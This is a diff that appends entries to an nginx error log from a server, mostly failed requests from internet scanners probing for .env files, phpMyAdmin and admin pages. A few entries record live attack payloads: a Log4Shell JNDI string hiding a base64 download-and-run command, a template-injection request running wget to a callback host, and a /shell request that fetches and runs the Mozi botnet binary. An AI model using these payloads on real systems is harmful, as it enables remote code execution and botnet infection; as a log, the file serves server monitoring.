@@ -168,3 +168,59 @@
 2022/11/24 17:12:37 [notice] 1#1: start worker process 22
 2022/11/24 17:12:54 [error] 22#22: *2 "/usr/share/nginx/html/polls/index.html" is not found (2: No such file or directory), client: 76.153.143.190, server: localhost, request: "GET /polls/ HTTP/1.1", host: "52.90.144.5"
 2022/11/24 17:12:57 [error] 22#22: *4 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 135.125.217.54, server: localhost, request: "GET /.env HTTP/1.1", host: "52.90.144.5"
+2022/11/24 17:17:11 [error] 22#22: *5 open() "/usr/share/nginx/html/:80:undefined" failed (2: No such file or directory), client: 206.189.107.37, server: localhost, request: "GET /:80:undefined?id= HTTP/1.1", host: "52.90.144.5", referrer: "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//164.92.120.75:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9iaW5zL3ZvaWQueDg2OyBjdXJsIC1PIGh0dHA6Ly8xOTEuMjM0LjIwMC4yMTYvYmlucy92b2lkLng4NjtjYXQgdm9pZC54ODYgPmphaWxzaGl0O2NobW9kICt4ICo7Li9qYWlsc2hpdCBjdQ==}')"
+2022/11/24 17:21:34 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/11/24 17:21:34 [notice] 22#22: gracefully shutting down
+2022/11/24 17:21:34 [notice] 22#22: exiting
+2022/11/24 17:21:34 [notice] 22#22: exit
+2022/11/24 17:21:34 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2022/11/24 17:21:34 [notice] 1#1: worker process 22 exited with code 0
+2022/11/24 17:21:34 [notice] 1#1: exit
+2022/11/24 17:22:42 [notice] 1#1: using the "epoll" event method
+2022/11/24 17:22:42 [notice] 1#1: nginx/1.23.2
+2022/11/24 17:22:42 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/11/24 17:22:42 [notice] 1#1: OS: Linux 5.15.0-1022-aws
+2022/11/24 17:22:42 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/11/24 17:22:42 [notice] 1#1: start worker processes
+2022/11/24 17:22:42 [notice] 1#1: start worker process 22
+2022/11/24 17:23:15 [error] 22#22: *1 "/usr/share/nginx/html/polls/index.html" is not found (2: No such file or directory), client: 66.23.227.23, server: localhost, request: "GET /polls/ HTTP/1.1", host: "52.90.144.5"
+2022/11/24 17:23:17 [error] 22#22: *3 "/usr/share/nginx/html/polls/index.html" is not found (2: No such file or directory), client: 204.186.55.233, server: localhost, request: "GET /polls/ HTTP/1.1", host: "52.90.144.5", referrer: "https://www.google.com/"
+2022/11/24 17:23:43 [error] 22#22: *4 "/usr/share/nginx/html/polls/index.html" is not found (2: No such file or directory), client: 66.23.227.23, server: localhost, request: "GET /polls/ HTTP/1.1", host: "52.90.144.5"
+2022/11/24 17:25:43 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2022/11/24 17:25:43 [notice] 22#22: gracefully shutting down
+2022/11/24 17:25:43 [notice] 22#22: exiting
+2022/11/24 17:25:43 [notice] 22#22: exit
+2022/11/24 17:25:43 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2022/11/24 17:25:43 [notice] 1#1: worker process 22 exited with code 0
+2022/11/24 17:25:43 [notice] 1#1: exit
+2022/11/24 17:26:28 [notice] 1#1: using the "epoll" event method
+2022/11/24 17:26:28 [notice] 1#1: nginx/1.23.2
+2022/11/24 17:26:28 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2022/11/24 17:26:28 [notice] 1#1: OS: Linux 5.15.0-1022-aws
+2022/11/24 17:26:28 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2022/11/24 17:26:28 [notice] 1#1: start worker processes
+2022/11/24 17:26:28 [notice] 1#1: start worker process 22
+2022/11/24 17:27:48 [error] 22#22: *4 "/usr/share/nginx/html/admin/index.html" is not found (2: No such file or directory), client: 66.23.227.23, server: localhost, request: "GET /admin/ HTTP/1.1", host: "52.90.144.5"
+2022/11/24 17:27:51 [error] 22#22: *4 "/usr/share/nginx/html/suduko/puzzles/index.html" is not found (2: No such file or directory), client: 66.23.227.23, server: localhost, request: "GET /suduko/puzzles/ HTTP/1.1", host: "52.90.144.5"
+2022/11/24 17:27:52 [error] 22#22: *7 "/usr/share/nginx/html/suduko/puzzles/index.html" is not found (2: No such file or directory), client: 63.88.73.11, server: localhost, request: "GET /suduko/puzzles/ HTTP/1.1", host: "52.90.144.5", referrer: "https://www.google.com/"
+2022/11/24 17:27:56 [error] 22#22: *4 "/usr/share/nginx/html/suduko/puzzleDB/index.html" is not found (2: No such file or directory), client: 66.23.227.23, server: localhost, request: "GET /suduko/puzzleDB/ HTTP/1.1", host: "52.90.144.5"
+2022/11/24 17:27:57 [error] 22#22: *8 "/usr/share/nginx/html/suduko/puzzleDB/index.html" is not found (2: No such file or directory), client: 63.117.14.134, server: localhost, request: "GET /suduko/puzzleDB/ HTTP/1.1", host: "52.90.144.5", referrer: "https://www.google.com/"
+2022/11/24 17:29:32 [error] 22#22: *9 open() "/usr/share/nginx/html/page" failed (2: No such file or directory), client: 192.99.62.110, server: localhost, request: "GET /page?id=2HzicOaXp6OvUPqnxaq42JPPQyQ&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27wget+http://cdvmidt71kdrucg00010o4cjhitgrgiou.oast.site%27);s HTTP/1.1", host: "52.90.144.5"
+2022/11/24 17:56:49 [error] 22#22: *10 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 95.214.235.205, server: localhost, request: "GET /.env HTTP/1.1", host: "52.90.144.5"
+2022/11/24 18:26:18 [error] 22#22: *12 open() "/usr/share/nginx/html/freepbx/recordings/index.php" failed (2: No such file or directory), client: 72.251.235.152, server: localhost, request: "GET /freepbx/recordings/index.php HTTP/1.0", host: "52.90.144.5"
+2022/11/24 18:36:33 [error] 22#22: *14 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 135.125.217.54, server: localhost, request: "GET /.env HTTP/1.1", host: "52.90.144.5"
+2022/11/24 19:41:00 [error] 22#22: *18 open() "/usr/share/nginx/html/html/recordings/index.php" failed (2: No such file or directory), client: 72.251.235.152, server: localhost, request: "GET /html/recordings/index.php HTTP/1.0", host: "52.90.144.5"
+2022/11/24 19:49:26 [error] 22#22: *19 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 95.214.235.205, server: localhost, request: "GET /.env HTTP/1.1", host: "52.90.144.5"
+2022/11/24 20:10:48 [error] 22#22: *22 open() "/usr/share/nginx/html/portal/redlion" failed (2: No such file or directory), client: 198.199.95.14, server: localhost, request: "GET /portal/redlion HTTP/1.1", host: "52.90.144.5"
+2022/11/24 20:19:28 [error] 22#22: *24 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 135.125.217.54, server: localhost, request: "GET /.env HTTP/1.1", host: "52.90.144.5"
+2022/11/24 20:37:01 [error] 22#22: *27 "/usr/share/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 42.230.216.19, server: localhost, request: "POST /HNAP1/ HTTP/1.0", host: "52.90.144.5:80"
+2022/11/24 20:39:35 [error] 22#22: *28 open() "/usr/share/nginx/html/hudson" failed (2: No such file or directory), client: 192.241.208.16, server: localhost, request: "GET /hudson HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:04:02 [error] 22#22: *30 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 27.45.88.89, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://27.45.88.89:44162/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "52.90.144.5:80"
+2022/11/24 21:27:02 [error] 22#22: *31 "/usr/share/nginx/html/suduko/puzzleDB/index.html" is not found (2: No such file or directory), client: 66.23.227.23, server: localhost, request: "GET /suduko/puzzleDB/ HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:36:33 [error] 22#22: *33 open() "/usr/share/nginx/html/w00tw00t.at.blackhats.romanian.anti-sec:)" failed (2: No such file or directory), client: 164.92.192.136, server: localhost, request: "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:36:33 [error] 22#22: *34 open() "/usr/share/nginx/html/phpMyAdmin/scripts/setup.php" failed (2: No such file or directory), client: 164.92.192.136, server: localhost, request: "GET /phpMyAdmin/scripts/setup.php HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:36:33 [error] 22#22: *35 open() "/usr/share/nginx/html/phpmyadmin/scripts/setup.php" failed (2: No such file or directory), client: 164.92.192.136, server: localhost, request: "GET /phpmyadmin/scripts/setup.php HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:36:33 [error] 22#22: *36 open() "/usr/share/nginx/html/pma/scripts/setup.php" failed (2: No such file or directory), client: 164.92.192.136, server: localhost, request: "GET /pma/scripts/setup.php HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:36:33 [error] 22#22: *37 open() "/usr/share/nginx/html/myadmin/scripts/setup.php" failed (2: No such file or directory), client: 164.92.192.136, server: localhost, request: "GET /myadmin/scripts/setup.php HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:36:33 [error] 22#22: *38 open() "/usr/share/nginx/html/MyAdmin/scripts/setup.php" failed (2: No such file or directory), client: 164.92.192.136, server: localhost, request: "GET /MyAdmin/scripts/setup.php HTTP/1.1", host: "52.90.144.5"
+2022/11/24 21:39:28 [error] 22#22: *39 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 185.246.221.138, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "52.90.144.5:80", referrer: "http://52.90.144.5:80/admin/login.asp"
